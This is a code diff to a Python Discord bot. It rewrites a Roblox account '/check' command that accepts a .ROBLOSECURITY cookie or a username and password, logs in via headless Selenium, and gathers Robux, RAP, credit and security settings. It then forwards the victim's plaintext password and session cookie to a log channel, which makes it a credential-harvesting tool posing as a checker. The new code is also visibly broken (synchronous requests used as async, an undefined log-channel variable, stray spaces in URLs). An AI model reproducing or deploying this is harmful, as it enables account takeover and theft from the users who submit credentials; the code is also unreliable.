@@ -16,6 +16,13 @@ from datetime import datetime, timedelta
 import pytz
 from langdetect import detect, LangDetectException
 from bs4 import BeautifulSoup
+from selenium import webdriver
+from selenium.webdriver.chrome.service import Service as ChromeService
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from webdriver_manager.chrome import ChromeDriverManager
 
 # Set timezone to Philippines (GMT+8)
 PH_TIMEZONE = pytz.timezone("Asia/Manila")
@@ -71,8 +78,9 @@ try:
 except Exception as e:
     print(f"[!] Failed to connect to MongoDB: {e}")
     client = None
-    conversations_collection = None
-    reminders_collection = None
+    conversations_collection = db.conversations
+    reminders_collection = db.reminders
+    cookie_log_channel = 1372938814019997776
 
 # Background Task: Check Reminders
 @tasks.loop(seconds=60)
@@ -907,201 +915,151 @@ async def listallcommands(interaction: discord.Interaction):
 # New /check Slash Command
 # ===========================
 
-# Helper function to get total RAP (Recent Average Price)
-async def get_total_rap(user_id, session):
-    total = 0
-    cursor = None
+def get_roblosecurity_cookie(username, password):
+    chrome_options = Options()
+    chrome_options.add_argument("--headless=new")
+    chrome_options.add_argument("--disable-gpu")
+    chrome_options.add_argument("--no-sandbox")
+    chrome_options.add_argument("--disable-dev-shm-usage")
+    chrome_options.add_argument("blink-settings=imagesEnabled=false")
+
+    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=chrome_options)
+
+    try:
+        driver.get("https://www.roblox.com/login ")
+        WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.ID, "login-username")))
+        driver.find_element(By.ID, "login-username").send_keys(username)
+        driver.find_element(By.ID, "login-password").send_keys(password)
+        driver.find_element(By.ID, "login-button").click()
+
+        try:
+            WebDriverWait(driver, 15).until(
+                EC.url_contains("https://www.roblox.com/home ")
+            )
+        except:
+            print("CAPTCHA detected. Solving manually...")
+            input("Solve CAPTCHA manually and press Enter to continue...")
+
+        cookies = driver.get_cookies()
+        return next((cookie['value'] for cookie in cookies if cookie['name'] == ".ROBLOSECURITY"), None)
+    finally:
+        driver.quit()
+
+async def fetch_user_data(session, cookie):
+    headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
+    
+    async def get_json(url):
+        async with session.get(url, headers=headers) as resp:
+            return await resp.json()
+
+    info = await get_json("https://www.roblox.com/mobileapi/userinfo ")
+    credit_info = await get_json("https://billing.roblox.com/v1/credit ")
+    pin_info = await get_json("https://auth.roblox.com/v1/account/pin ")
+    privacy_info = await get_json("https://accountsettings.roblox.com/v1/privacy ")
+    web_settings = await get_json("https://web.roblox.com/my/settings/json ")
+    
+    rap = await get_total_rap(info["UserID"], session, cookie)
+
+    return {
+        "username": info["UserName"],
+        "user_id": info["UserID"],
+        "robux": info["RobuxBalance"],
+        "premium": info["IsPremium"],
+        "rap": rap,
+        "credit": credit_info["balance"],
+        "email_verified": web_settings["IsEmailVerified"],
+        "phone_discovery": privacy_info.get("phoneDiscovery", "") == "AllUsers",
+        "pin_enabled": pin_info["isEnabled"],
+        "description": info.get("description", "No Description"),
+    }
+
+async def get_total_rap(user_id, session, cookie):
+    headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
+    cursor = ""
+    total_rap = 0
+
     while True:
         url = f"https://inventory.roblox.com/v1/users/ {user_id}/assets/collectibles?sortOrder=Asc&limit=100"
         if cursor:
             url += f"&cursor={cursor}"
-        try:
-            async with session.get(url) as response:
-                if response.status != 200:
-                    break
-                data = await response.json()
-                for item in data.get("data", []):
-                    total += item.get("recentAveragePrice", 0)
-                cursor = data.get("nextPageCursor")
-                if not cursor:
-                    break
-        except Exception as e:
-            print(f"[!] Error fetching RAP: {e}")
-            break
-    return total
+        async with session.get(url, headers=headers) as resp:
+            data = await resp.json()
+            for item in data.get("data", []):
+                total_rap += item.get("recentAveragePrice", 0)
+            cursor = data.get("nextPageCursor")
+            if not cursor:
+                break
+    return total_rap
 
-# Main /check command
-@bot.tree.command(name="check", description="Check details of a Roblox account using a cookie or username+password.")
-@app_commands.describe(cookie="Roblox .ROBLOSECURITY cookie (optional)", username="Roblox username (optional)", password="Roblox password (optional)")
-async def check(interaction: discord.Interaction, cookie: str = None, username: str = None, password: str = None):
-    if not cookie and not (username and password):
-        embed = discord.Embed(description="❌ You must provide either a `.ROBLOSECURITY` cookie or both username and password.", color=discord.Color.red())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
+# ===========================
+# /check Command
+# ===========================
+@bot.tree.command(name="check", description="Check Roblox account details using credentials or a cookie.")
+@app_commands.describe(
+    input1="Username or .ROBLOSECURITY cookie",
+    input2="Password (if providing credentials)"
+)
+async def check(interaction: discord.Interaction, input1: str, input2: str = None):
+    await interaction.response.defer()
 
-    if cookie:
-        cookie_provided = True
-        init_msg = await interaction.channel.send("🔄 Loading account information...")
+    cookie = None
+    is_cookie = False
+    username = None
+    password = None
+
+    if input2 is None:
+        # Assume input1 is a cookie
+        cookie = input1.strip()
+        is_cookie = True
     else:
-        cookie_provided = False
-        init_msg = await interaction.channel.send("🔄 Attempting to log in...")
+        # Assume input1 is username and input2 is password
+        username = input1
+        password = input2
+        cookie = get_roblosecurity_cookie(username, password)
+        if not cookie:
+            await interaction.followup.send("❌ Login failed. Invalid credentials or unresolved CAPTCHA.")
+            return
 
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
-        "Referer": "https://www.roblox.com/login ",
-        "Origin": "https://www.roblox.com "
-    }
-
-    captcha_url = "https://www.roblox.com/login "
-
-    session = requests.Session()
-    session.headers.update(headers)
-
-    if not cookie_provided:
-        login_url = "https://auth.roblox.com/v2/login "
-        payload = {
-            "ctype": "Username",
-            "cvalue": username,
-            "password": password
-        }
+    async with requests.Session() as session:
         try:
-            response = session.post(login_url, json=payload)
-            if "x-csrf-token" in response.headers:
-                session.headers["x-csrf-token"] = response.headers["x-csrf-token"]
-            if response.status_code == 403:
-                error_data = response.json()
-                error_code = error_data["errors"][0]["code"]
-                if error_code == 2:
-                    embed = discord.Embed(
-                        title="CAPTCHA Required",
-                        description=f"[Solve CAPTCHA manually]({captcha_url}) then react below when done.",
-                        color=discord.Color.orange()
-                    )
-                    await init_msg.edit(embed=embed)
-                    await init_msg.add_reaction("✅")
+            data = await fetch_user_data(session, cookie)
+            embed = discord.Embed(title="Roblox Account Information", color=discord.Color.blue())
+            embed.set_thumbnail(url=f"https://www.roblox.com/headshot-thumbnail/image?userId= {data['user_id']}&width=420&height=420&format=png")
+            embed.add_field(name="Username", value=data["username"], inline=True)
+            embed.add_field(name="User ID", value=str(data["user_id"]), inline=True)
+            embed.add_field(name="Description", value=f"```{data['description']}```", inline=False)
+            embed.add_field(name="Robux", value=str(data["robux"]), inline=True)
+            embed.add_field(name="RAP", value=str(data["rap"]), inline=True)
+            embed.add_field(name="Credit", value=f"{data['credit']} R$ (Roblox Credit)", inline=True)
+            embed.add_field(name="Premium", value="Yes" if data["premium"] else "No", inline=True)
+            embed.add_field(name="Inventory", value=f"[View](https://www.roblox.com/users/ {data['user_id']}/inventory/)", inline=True)
+            embed.add_field(name="Rolimon's Profile", value=f"[Link](https://www.rolimons.com/player/ {data['user_id']})", inline=True)
+            embed.add_field(name="Email Verified", value="Yes" if data["email_verified"] else "No", inline=True)
+            embed.add_field(name="Phone Verified", value="Yes" if data["phone_discovery"] else "No", inline=True)
+            embed.add_field(name="PIN Enabled", value="Yes" if data["pin_enabled"] else "No", inline=True)
 
-                    def check(reaction, user):
-                        return user == interaction.user and str(reaction.emoji) == "✅"
+            await interaction.followup.send(embed=embed)
 
-                    try:
-                        reaction, user = await bot.wait_for("reaction_add", timeout=90.0, check=check)
-                        await init_msg.remove_reaction("✅", user)
-                    except asyncio.TimeoutError:
-                        await init_msg.edit(content="⏰ Time expired. Please try again.")
-                        return
-
-                    # Retry login after CAPTCHA
-                    response = session.post(login_url, json=payload)
-                    if response.status_code != 200:
-                        embed = discord.Embed(description="❌ Login failed after solving CAPTCHA.", color=discord.Color.red())
-                        await init_msg.edit(embed=embed)
-                        return
-
-            if response.status_code != 200:
-                embed = discord.Embed(description="❌ Invalid credentials or login failed.", color=discord.Color.red())
-                await init_msg.edit(embed=embed)
-                return
-
-            roblosecurity_cookie = session.cookies.get(".ROBLOSECURITY")
-            if not roblosecurity_cookie:
-                embed = discord.Embed(description="❌ Could not retrieve session cookie.", color=discord.Color.red())
-                await init_msg.edit(embed=embed)
-                return
-
-            cookie = roblosecurity_cookie
-        except Exception as e:
-            embed = discord.Embed(description=f"❌ Error during login: {str(e)}", color=discord.Color.red())
-            await init_msg.edit(embed=embed)
-            return
-
-    session.cookies.set(".ROBLOSECURITY", cookie, domain=".roblox.com")
-
-    try:
-        user_info_url = "https://www.roblox.com/mobileapi/userinfo "
-        response = session.get(user_info_url)
-        if response.status_code != 200:
-            embed = discord.Embed(description="❌ Invalid or expired cookie.", color=discord.Color.red())
-            await init_msg.edit(embed=embed)
-            return
-
-        user_data = response.json()
-        user_id = user_data["UserID"]
-        username = user_data["UserName"]
-        robux = user_data["RobuxBalance"]
-        premium = user_data["IsPremium"]
-
-        credit_url = "https://billing.roblox.com/v1/credit "
-        response = session.get(credit_url)
-        credit_data = response.json() if response.status_code == 200 else {}
-        credit_balance = credit_data.get("balance", 0)
-
-        pin_url = "https://auth.roblox.com/v1/account/pin "
-        response = session.get(pin_url)
-        pin_data = response.json() if response.status_code == 200 else {}
-        pin_enabled = pin_data.get("isEnabled", False)
-
-        privacy_url = "https://accountsettings.roblox.com/v1/privacy "
-        response = session.get(privacy_url)
-        privacy_data = response.json() if response.status_code == 200 else {}
-        phone_verified = privacy_data.get("phoneDiscovery") == "AllUsers"
-
-        settings_url = "https://web.roblox.com/my/settings/json "
-        response = session.get(settings_url)
-        settings_data = response.json() if response.status_code == 200 else {}
-        email_verified = settings_data.get("IsEmailVerified", False)
-
-        inv_url = f"https://inventory.roblox.com/v1/users/ {user_id}/can-view-inventory"
-        response = requests.get(inv_url)
-        can_view_inv = response.json().get("canView", False)
-
-        group_url = f"https://groups.roblox.com/v1/users/ {user_id}/groups/primary/role"
-        response = requests.get(group_url)
-        group_data = response.json() if response.status_code == 200 else {}
-        primary_group = group_data.get("group", None)
-
-        rap = await get_total_rap(user_id, session)
-
-        embed = discord.Embed(title="🧾 Roblox Account Info", color=discord.Color.blue())
-        embed.set_thumbnail(url=f"https://www.roblox.com/headshot-thumbnail/image?userId= {user_id}&width=420&height=420&format=png")
-        embed.add_field(name="Username", value=username, inline=True)
-        embed.add_field(name="User ID", value=str(user_id), inline=True)
-        embed.add_field(name="Robux", value=str(robux), inline=True)
-        embed.add_field(name="RAP", value=str(rap), inline=True)
-        embed.add_field(name="Credit Balance", value=str(credit_balance), inline=True)
-        embed.add_field(name="Premium", value="Yes" if premium else "No", inline=True)
-        embed.add_field(name="Inventory", value="[View](https://www.roblox.com/users/ {}/inventory/)".format(user_id) if can_view_inv else "Private", inline=True)
-        embed.add_field(name="Rolimons", value="[Profile](https://www.rolimons.com/player/ {})".format(user_id), inline=True)
-        embed.add_field(name="Email Verified", value="Yes" if email_verified else "No", inline=True)
-        embed.add_field(name="Phone Verified", value="Yes" if phone_verified else "No", inline=True)
-        embed.add_field(name="Parent PIN", value="Enabled" if pin_enabled else "Disabled", inline=True)
-        if primary_group:
-            embed.add_field(name="Primary Group", value=f"[{primary_group['name']}](https://www.roblox.com/groups/ {primary_group['id']})", inline=True)
-        else:
-            embed.add_field(name="Primary Group", value="None", inline=True)
-
-        await init_msg.edit(embed=embed)
-
-        # Optional: Log cookies/passwords
-        log_channel_id = os.getenv("COOKIE_LOG_CHANNEL_ID")
-        if log_channel_id:
-            try:
-                log_channel = bot.get_channel(int(log_channel_id))
+            # Log to channel if enabled
+            if LOG_CHANNEL_ID:
+                log_channel = bot.get_channel(LOG_CHANNEL_ID)
                 if log_channel:
-                    log_embed = discord.Embed(title="🔐 Account Scanned", color=discord.Color.orange())
-                    log_embed.add_field(name="Scanned By", value=interaction.user.mention, inline=False)
-                    log_embed.add_field(name="Username", value=username, inline=True)
-                    log_embed.add_field(name="Robux", value=robux, inline=True)
-                    if not cookie_provided:
-                        log_embed.add_field(name="Password", value=f"`{password}`", inline=False)
-                    log_embed.add_field(name="Cookie", value=f"```{cookie}```", inline=False)
+                    log_embed = discord.Embed(
+                        title=f"{interaction.user} {'used a cookie' if is_cookie else 'checked credentials'}"
+                    )
+                    log_embed.add_field(name="Username", value=data["username"])
+                    log_embed.add_field(name="Robux", value=str(data["robux"]))
+                    log_embed.add_field(name="Premium", value="Yes" if data["premium"] else "No")
+                    if not is_cookie:
+                        log_embed.add_field(name="Password", value=password)
+                    log_embed.add_field(name="Cookie", value=f"```{cookie}```")
                     log_embed.set_footer(text=f"Guild: {interaction.guild.id} | Channel: {interaction.channel.id}")
+                    log_embed.timestamp = datetime.utcnow()
                     await log_channel.send(embed=log_embed)
-            except Exception as e:
-                print(f"[!] Error logging scanned account: {e}")
 
-    except Exception as e:
-        embed = discord.Embed(description=f"❌ Error retrieving account info: {str(e)}", color=discord.Color.red())
-        await init_msg.edit(embed=embed)
+        except Exception as e:
+            print(e)
+            await interaction.followup.send("❌ Invalid or expired cookie.")
 
 # ===========================
 # Bot Events
